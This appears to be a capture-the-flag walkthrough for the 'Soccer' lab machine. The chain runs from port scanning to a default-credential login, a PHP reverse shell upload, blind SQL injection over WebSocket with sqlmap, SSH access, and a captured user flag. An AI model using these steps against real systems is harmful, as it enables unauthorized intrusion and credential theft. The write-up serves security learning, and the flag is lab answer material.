# Reconnaissance

## Port Scan (nmap)

**Command:**\
*sudo nmap -sC -sV -O -v -T4 -p- {IP address}*

**Command Description:**\
* -sC : Use default scripts
* -sV Service version
* -O : OS detection
* -v : Verbose
* -T4 : Scan intensity (aggressive), 
* -p- : Scan all ports
* {IP address} - Target host

**Results:**\
TCP Ports Open:
* 22 - SSH
* 80 - HTTP
* 9091 - mltec-xmlmail

**Actions:**\
Edit */etc/hosts* and add the follwing line to display the website correctly on port 80 (HTTP): *{IP address} 	soccer.htb*

## Directory Scan (gobuster)

**Command:**\
*gobuster dir --url http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt*

**Command Description:**
* dir : Directory scan
* --url : Target url
* -w : Directory wordlist

**Results:**\
Directory found: */tiny*

**Actions:**\
Navigate to: *http://soccer.htb/tiny*

## OSINT

**Actions:**\
Search on google for: *tinyfilemanager default credentials*

**Results**\
URL: https://github.com/prasathmani/tinyfilemanager

Default Credentials:\
Username/Password:
* *admin/admin@123*
* *user/12345*

Note: TinyFileManager uses PHP.

## PHP Reverse Shell

**Actions:**\
Create a new file with this php reverse shell script: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php (or any other PHP reverse shell script).\
Edit the file and change the following variables *$ip* (the machine a victim should connect to) and *$port* (the port a victim should connect to).

## Reverse Shell Listener (netcat)

**Command:** *sudo nc -lvnp 9001*

**Command Description:**\
* -l : Listener (listen for incoming connections)
* -v : Verbose
* -n : Numeric only ip addresses (no DNS)
* -p : Port

**Results:**\
Listening for incoming connections on port 9001.


## Account Access

**Actions:**\
Use admin credentials acquired from the *OSINT* phase (*admin/admin@123*) to log into the tinyfilemanger portal *soccer.htb/tiny*

## File Upload

**Actions:**\
Navigate to *tiny* directory and then *uploads* directory and then press upload on the top right corner and choose the previously created modified php reverse shell from the *PHP Reverse Shell* phase.

## Triggering the PHP Reverse Shell

**Actions:**\
Navigate to: http://soccer.htb/tiny/uploads/php-reverse-shell.php

**Results:**\
The PHP reverse shell will trigger and open a shell from the netcat listener that was setup in the *Reverse Shell Listener (netcat)* phase.

## Inside the Shell

Print */etc/hosts* to see if there are other subdomains/hosts *cat* command.

**Command:** *cat /etc/hosts*

**Results:**\
It displays a subdomain *soc-player.soccer.htb* that could be accessed.

## Navigating the New Domain

Add the subdomain *soc-player.soccer.htb* to your machine hosts file and then access the domain in the browser.
The page will display and then nagivate to "Signup" and create an account and login using the credentials.

By viewing the source code of the ticket system, and scrolling to the bottom we can see that there is a variable thats using WebSocket *var ws = new WebSocket(ws://soc-player.soccer.htb:9091");*. After searching for websocket vulnerabilities we stumble upon this link: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html which contains information on how to perform a Automated Blind SQL injection over WebSocket.

Create a new python file and copy paste the code provided in the link.
In the code, change the *ws_server* variable to the same url as the url found in the the source code of the ticket system.
Also change the "data" variable from *employeeID* to just *id* and then save.

## Running the SQL Injection Script

Run the python script/file which will create a MiddleWare Server.

**Command:** *python3 [filename].py*

**Results:**\
Displays information about sending payloads in http://localhost:/?id=* 

## Using SQL To Find Information (sqlmap)

Use *sqlmap* and type the following command to recieve database information using the url.
Note: it might take some time.

**Command:** *sqlmap -u "http://localhost:8081/?id=1" --batch --dbs*

**Results:**\
Databases will be displayed with *soccer_db* being the interesting one.

Use *sqlmap* and use the following command which uses the database *soccer_db* we acquired to dump the database.

**Command:** *sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables -T accounts -C username,password --dump*

**Command Description:**\
* -D : Query the specified database
* --tables : List tables
* -T : Quuery specified table
* -C : Query specified columns
* --dump : Dump the queried information

**Results:**\
A entry with username and password will be displayed.\
Username: player\
Password: PlayerOftheMatch2022

## SSHing Into the User Found In the Database

Use SSH with the username and password from the previous section to access the user.
The user will have the user flag.

Navgivate to the tmp directory and download *linpeas* and then run the linpeas script and wait until the user and system have been enumerated for vulnerabilities.

# Goals

* USER Flag: 73a57d7e814d39476159dbcb83f6694c
* ROOT Flag:











